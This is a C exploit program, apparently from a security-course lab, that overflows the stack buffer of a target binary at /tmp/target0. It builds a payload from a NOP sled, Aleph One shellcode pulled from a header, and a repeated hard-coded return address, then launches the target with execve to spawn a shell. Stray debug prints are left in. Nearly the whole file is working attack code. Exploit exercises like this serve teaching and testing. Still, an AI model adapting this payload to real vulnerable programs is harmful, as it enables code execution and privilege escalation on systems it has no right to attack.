#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  printf("AA\n");
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  
  printf("BB\n");  
  char rt_arr[152] = "";
  for (int i=0; i < 38; i++){
	strcat(rt_arr, "\xf4\xfa\xff\xbf");
  }

  printf("rt_arr is : %s\n", rt_arr);

  int sizeOfNoOp = 203;
  int sizeOfShell =  sizeof(shellcodeAlephOne) / sizeof(shellcodeAlephOne[0]);
  int sizeOfRtAdd = sizeof(rt_arr) / sizeof(rt_arr[0]);
  int n = sizeOfNoOp + sizeOfShell + sizeOfRtAdd;
  char a[n];
  
  printf("CC\n");  
  fflush( stdout );

  memset(a, '\x90', sizeOfNoOp*sizeof(char));
 
  memcpy(a+sizeOfNoOp, shellcodeAlephOne, sizeOfShell*sizeof(char));

  memcpy(a+sizeOfNoOp+sizeOfShell - 1, rt_arr , sizeOfRtAdd*sizeof(char));
   
  printf("String is : %s\n", a); 
  fflush( stdout );
  
  args[1] = a; 
  args[2] = NULL;
 
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");



}
